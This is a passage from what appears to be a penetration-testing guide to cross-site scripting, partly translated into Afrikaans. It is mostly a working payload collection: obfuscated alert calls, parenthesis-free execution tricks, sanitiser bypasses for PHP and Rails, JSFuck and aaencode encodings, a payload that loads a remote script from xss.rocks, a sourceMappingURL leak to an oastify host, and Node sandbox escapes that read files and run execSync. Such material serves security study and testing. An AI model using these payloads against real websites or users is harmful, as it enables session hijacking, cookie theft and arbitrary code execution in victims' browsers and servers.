"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Spesiale ontsnappingsreekse**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Spasievervangings binne JS code**
```javascript
<TAB>
/**/
```
**JavaScript comments (van** [**JavaScript Comments**](#javascript-comments) **truuk)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (van** [**JavaScript new line**](#javascript-new-lines) **truuk)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript witspasies**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript binne 'n kommentaar**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript sonder hakies**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Arbitrêre funksie (alert) oproep**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Daar is **JS code** wat **onveilig data gebruik wat deur 'n attacker beheer word**, soos `location.href`. 'n attacker kan dit misbruik om arbitrêre JS-kode uit te voer.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Daar sal jy 'n gedetailleerde **explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them** vind.\
Moet ook nie vergeet dat **aan die einde van die genoemde post** 'n verklaring oor [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) te vind is nie.

### Upgrading Self-XSS

### Cookie XSS

As jy 'n XSS kan trigger deur die payload binne 'n cookie te stuur, is dit gewoonlik 'n self-XSS. As jy egter 'n **vulnerable subdomain to XSS** vind, kan jy hierdie XSS misbruik om 'n cookie in die hele domein in te voeg en sodoende die cookie XSS in die hoofdomein of ander subdomeine (diegene vatbaar vir cookie XSS) te trigger. Hiervoor kan jy die cookie tossing attack gebruik:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Jy kan 'n goeie misbruik van hierdie tegniek in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) vind.

### Sending your session to the admin

Miskien kan 'n gebruiker sy profiel met die admin deel, en as die self XSS binne die gebruiker se profiel is en die admin dit oopmaak, sal hy die kwetsbaarheid trigger.

### Session Mirroring

As jy 'n self XSS vind en die webblad het 'n **session mirroring for administrators** — byvoorbeeld kliënte kan vir hulp vra sodat die admin sien wat jy in jou session sien, maar vanuit sy eie session — kan jy die **administrator trigger your self XSS** en sy cookies/session steel.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

Wanneer 'n web-app Emscripten/WASM gebruik, woon konstante strings (soos HTML format stubs) in writable linear memory. 'n Enkele in‑WASM overflow (bv. unchecked memcpy in 'n edit pad) kan aangrensende strukture korrupteer en skryfoperasies na daardie konstantes herlei. Om 'n template soos "<article><p>%.*s</p></article>" na "<img src=1 onerror=%.*s>" oor te skryf verander gesanitiseerde invoer in 'n JavaScript handler-waarde en lewer onmiddellike DOM XSS by render.

Kyk die toegewyde bladsy vir exploit-workflow, DevTools memory helpers, en defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Jy kan nagaan of die **reflected values** in die server (of aan die client-kant) **unicode normalized** word en hierdie funksionaliteit misbruik om beskermings te omseil. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

As gevolg van **RoR mass assignment** word aanhalingstekens in die HTML ingevoeg en word die aanhalingsbeperking omseil, sodat ekstra velde (onfocus) binne die tag bygevoeg kan word.\
Formuliervoorbeeld ([from this report](https://hackerone.com/reports/709336)), as jy die payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Die paar "Key","Value" sal soos volg teruggegee word:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Dan sal die onfocus-attribuut ingevoeg word en XSS sal plaasvind.

### Spesiale kombinasies
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

If you find that you can **inject headers in a 302 Redirect response** you could try to **make the browser execute arbitrary JavaScript**. Dit is **nie eenvoudig nie** aangesien moderne blaaiers nie die HTTP response body interpreteer as die HTTP response status code 'n 302 is nie, dus is 'n cross-site scripting payload nutteloos.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) kan jy lees hoe om verskeie protokolle binne die Location header te toets en te sien of enige van hulle die browser toelaat om die XSS payload binne die body te inspekteer en uit te voer.\
Voorheen bekende protokolle: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Slegs Letters, Syfers en Punte

As jy in staat is om die **callback** wat javascript gaan **execute** aan te dui, beperk tot daardie karakters. [**Read this section of this post**](#javascript-function) om te sien hoe om hierdie gedrag te misbruik.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Die enigste **Content-Type**s wat Chrome sal ondersteun om 'n **loaded script** uit te voer, is dié wat binne die const **`kSupportedJavascriptTypes`** van [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc) is.
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Skripsoorte vir XSS

(Van [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Watter tipes kan aangedui word om 'n skrip te laai?
```html
<script type="???"></script>
```
Die antwoord is:

- **module** (verstek, niks om te verduidelik)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles is 'n funksie waarmee jy 'n klomp data (HTML, CSS, JS…) saam in 'n **`.wbn`** lêer kan pak.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Laat toe om die import-sintaksis te verbeter
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Hierdie gedrag is gebruik in [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) om 'n library na eval te remap, wat misbruik moontlik maak en sodoende XSS kan veroorsaak.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Hierdie funksie is hoofsaaklik bedoel om probleme wat deur pre-rendering veroorsaak word op te los. Dit werk soos volg:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types na XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Die volgende content types kan XSS in alle blaaiers uitvoer:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? nie in die lys nie maar ek dink ek het dit in 'n CTF gesien)
- application/rss+xml (off)
- application/atom+xml (off)

In ander blaaiers kan ander **`Content-Types`** gebruik word om arbitrêre JS uit te voer, kyk: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

As die bladsy 'n text/xml content-type terugstuur is dit moontlik om 'n namespace aan te dui en arbitrêre JS uit te voer:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Spesiale Vervangingspatrone

Wanneer iets soos **`"some {{template}} data".replace("{{template}}", <user_input>)`** gebruik word, kan die aanvaller [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) gebruik om te probeer sekere beskermings te omseil: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Byvoorbeeld in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), is dit gebruik om **'n JSON-string binne 'n script te ontsnap** en ewekansige kode uit te voer.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

As jy slegs 'n beperkte stel karakters het om te gebruik, kyk na hierdie ander geldige oplossings vir XSJail-probleme:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
As **alles undefined** is voordat onbetroubare kode uitgevoer word (soos in [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), is dit moontlik om nuttige objekte "uit niks" te genereer om die uitvoering van arbitrêre onbetroubare kode te misbruik:

- Deur import() te gebruik
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Toegang tot `require` indirek

[Volgens hierdie](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) word modules deur Node.js binne 'n funksie toegedraai, soos volg:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Daarom, as ons van daardie module **'n ander funksie kan aanroep**, is dit moontlik om `arguments.callee.caller.arguments[1]` van daardie funksie te gebruik om toegang tot **`require`** te kry:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Op 'n soortgelyke wyse as die vorige voorbeeld is dit moontlik om **use error handlers** te gebruik om toegang tot die **wrapper** van die module te kry en die **`require`** funksie te bekom:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuskering & Gevorderde Omseiling

- **Verskeie obfuskeringe op 'n bladsy:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Meer gesofistikeerde JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
